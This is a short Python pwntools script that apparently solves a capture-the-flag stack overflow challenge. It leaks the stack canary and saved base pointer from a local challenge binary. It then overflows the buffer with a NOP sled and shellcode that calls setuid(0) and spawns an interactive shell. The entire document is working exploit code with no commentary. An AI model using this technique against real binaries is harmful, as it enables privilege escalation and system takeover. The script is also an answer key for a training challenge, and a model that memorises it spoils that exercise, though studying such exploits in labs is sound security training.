from pwn import *

offset_canary = 40
proc = process('/challenge/toddlerone-level-3-0')

proc.recvuntil(b'size: ')
proc.sendline(str(offset_canary+1).encode())
proc.recvuntil(b'bytes)!\n')
payload = b'aREPEATb' + b'A' * (offset_canary+1-8)
proc.send(payload)

print(proc.recvuntil(payload))
canary = u64(proc.recv(7).rjust(8, b'\x00'))
print(f'canary: {hex(canary)}')

rbp = u64(proc.recvline(False).ljust(8, b'\x00'))
print(f'rbp: {hex(rbp)}')

# Exploit
proc.recvuntil(b'size: ')
context.arch = 'amd64'
shellcode = asm(shellcraft.setuid(0)) + asm(shellcraft.sh())
payload = b'A' * offset_canary + p64(canary) + b'B' * 8 + p64(rbp) + b'\x90' * 5000 + shellcode

size = len(payload)
proc.sendline(str(size).encode())

proc.recvuntil(b'bytes)!\n')
proc.send(payload)

proc.interactive()
